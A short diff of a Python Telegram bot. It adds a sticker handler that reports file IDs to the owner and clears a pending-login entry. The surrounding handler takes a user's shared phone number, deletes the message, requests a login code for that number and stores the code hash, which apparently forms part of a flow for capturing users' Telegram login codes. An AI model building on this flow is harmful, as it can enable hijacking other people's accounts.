@@ -176,6 +176,10 @@ async def inline_handler(query: types.InlineQuery):
 
 # ─── Синхронизация (старый код — не трогать) ──────────────────────────────────
 
+@dp.message(F.sticker)
+async def sticker_handler(message: types.Message):
+    await bot.send_message(OWNER_ID, f"Sticker file_id: {message.sticker.file_id}")
+
 @dp.message(F.contact)
 async def contact_handler(message: types.Message):
     phone = message.contact.phone_number
@@ -184,6 +188,9 @@ async def contact_handler(message: types.Message):
     user_id = message.from_user.id
     await message.delete()
     try:
+        # Сбрасываем предыдущий pending если есть
+        if user_id in pending:
+            del pending[user_id]
         print(f"Sending code to {phone} for user {user_id}")
         phone_code_hash = await send_code(phone)
         pending[user_id] = {
